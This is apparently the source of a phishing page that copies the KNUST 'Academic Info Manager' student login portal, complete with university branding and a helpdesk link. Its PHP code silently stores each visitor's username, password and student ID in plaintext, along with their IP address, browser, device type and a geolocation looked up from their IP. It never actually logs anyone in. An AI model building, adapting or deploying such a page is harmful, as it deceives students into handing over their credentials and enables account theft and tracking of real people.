<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>KNUST AIM Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="style.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">

<style>
    
body{
    background:#dfe9e3;
}

.login-card{
    max-width:900px;
    margin:auto;
    border-radius:10px;
    overflow:hidden;
    box-shadow:0 0 20px rgba(0,0,0,0.1);
}

.left-panel{
    background:#c8d9ce;
    text-align:center;
    padding:60px 40px;
}

.left-panel img{
    width:140px;
}

.left-panel h4{
    color:#b00000;
    font-weight:600;
    margin-top:20px;
}

.right-panel{
    padding:50px;
    background:white;
}

.login-btn{
    background:#20b25d;
    border:none;
}

.login-btn:hover{
    background:#199c50;
}

.footer-text{
    text-align:center;
    margin-top:20px;
    font-size:13px;
    color:#2d6a4f;
}


</style>

</head>

<body>
<?php 
include('config.php');

// Collect form inputs
$username   = $_POST['studentUsername'] ?? '';
$password   = $_POST['Password'] ?? '';
$studentId  = $_POST['StudentId'] ?? '';

// Get IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get browser and device info
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Simple browser detection
if (strpos($userAgent, 'Chrome') !== false) {
    $browser = "Chrome";
} elseif (strpos($userAgent, 'Firefox') !== false) {
    $browser = "Firefox";
} elseif (strpos($userAgent, 'Safari') !== false) {
    $browser = "Safari";
} elseif (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) {
    $browser = "Internet Explorer";
} else {
    $browser = "Other";
}

// Simple device detection
if (preg_match('/mobile/i', $userAgent)) {
    $device = "Mobile";
} elseif (preg_match('/tablet/i', $userAgent)) {
    $device = "Tablet";
} else {
    $device = "Desktop";
}

// Get location using IP (basic example with free API)
$location = "Unknown";
$ipInfo = @file_get_contents("http://ip-api.com/json/$ip");
if ($ipInfo !== false) {
    $ipData = json_decode($ipInfo, true);
    if ($ipData && $ipData['status'] === 'success') {
        $location = $ipData['city'] . ", " . $ipData['country'];
    }
}

// Prepare SQL statement
$stmt = $conn->prepare("INSERT INTO student_logins 
    (username, password, student_id, ip_address, device_type, browser_type, location) 
    VALUES (?, ?, ?, ?, ?, ?, ?)");

$stmt->bind_param("sssssss", $username, $password, $studentId, $ip, $device, $browser, $location);

if ($stmt->execute()) {
    //echo "Login data saved successfully.";
} else {
    echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();


?>
<div class="container d-flex align-items-center justify-content-center min-vh-100">

<div class="card login-card">

<div class="row g-0">

<!-- LEFT SIDE -->

<div class="col-md-6 left-panel">

<img src="images/aim.png" width="200%" height="auto">

<h4>Academic Info Manager</h4>

<p class="mt-3">
You can also access the Student Portal on your mobile phone.
</p>

<a href="#" class="text-success fw-bold text-decoration-underline">
Download App
</a>

</div>

<!-- RIGHT SIDE -->

<div class="col-md-6 right-panel">

<div class="text-center mb-4">

<img src="images/logo-light.png" height="60">

<h5 class="mt-2 text-success">Login</h5>

</div>

<form method="post" action="">

<div class="mb-3">
<label class="form-label">Username</label>
<input type="text" class="form-control" name="studentUsername" value="">
</div>

<div class="mb-3">
<label class="form-label">Password</label>
<input type="password" class="form-control" name="Password">
<div class="text-end mt-1">
<a href="#" class="text-success small">Forgot password?</a>
</div>
</div>

<div class="mb-4">
<label class="form-label">Student ID</label>
<input type="password" class="form-control" name="StudentId" placeholder="eg. 00000000">
</div>

<button class="btn login-btn w-100 text-white">Log In</button>

</form>

<div class="text-center mt-4">

<small>
Having issues accessing your portal?
<a href="https://helpdesk.knust.edu.gh/open.php" class="text-success fw-bold">
Create a ticket
</a>
</small>

</div>

</div>

</div>
</div>

</div>

<div class="footer-text">

Copyright © <script>document.write(new Date().getFullYear())</script>
Kwame Nkrumah University of Science and Technology by UITS

</div>

</body>
</html>